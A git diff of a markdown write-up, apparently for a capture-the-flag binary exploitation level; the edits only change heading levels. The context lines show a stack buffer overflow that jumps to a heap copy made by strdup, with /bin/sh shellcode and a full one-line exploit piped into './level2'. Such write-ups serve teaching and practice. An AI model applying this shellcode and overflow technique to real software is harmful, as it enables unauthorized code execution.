@@ -8,7 +8,7 @@ This time, the executable doesn't call `system` ; we'll have to do it ourselves,
 
 There's a subtlety here : usually, we could run the code by directly pointing our return address to the buffer. But here, all stack addresses start with `0xb` - which is exactly what is checked by the `p` function. We'll have to use the heap by taking advantage of the `strdup` (which will duplicate our shellcode there) and setting our `eip` register to wherever `strdup` copies our buffer.
 
-## The exploit
+## **The exploit**
 
 We need three things :
 
@@ -24,7 +24,7 @@ We'll have something like this :
 python2 -c 'print(NOP_INSTRUCTION * (BUFFER_SIZE - SHELLCODE_SIZE) + SHELLCODE + DESIRED_ADDRESS)'
 ```
 
-### **Size of the buffer**
+## **Size of the buffer**
 
 In GDB, we can run
 ```
@@ -42,7 +42,7 @@ We can tell the buffer starts at `0xbffff6cc` by inputting a bunch of `A`'s and 
 
 A quick `python2 -c "print(0xbffff71c - 0xbffff6cc)"` tells us the "buffer size" : `80`.
 
-### **Shellcode**
+## **Shellcode**
 
 For the shellcode, no need to reinvent the wheel. There are plenty of existing shellcodes on the internet.
 
@@ -52,7 +52,7 @@ On [this website](https://beta.hackndo.com/buffer-overflow/), we find the follow
 \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
 ```
 
-### **Address**
+## **Address**
 
 Finally, we need the target address. We want something on the heap, so the place where `strdup` copies the buffer would be good.
 
@@ -64,7 +64,7 @@ p/x $eax
 
 We get `0x804a008`.
 
-### **The command**
+## **The command**
 
 Now we can substitute :
 
@@ -78,7 +78,7 @@ Finally, we have to pipe it into the executable. Same as before, we run :
 ( python2 -c 'print("\x90" * 35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x08\xa0\x04\x08")' ; cat ) | ./level2
 ```
 
-## The flag
+## **The flag**
 
 It works ! In our interactive shell, we run :
 
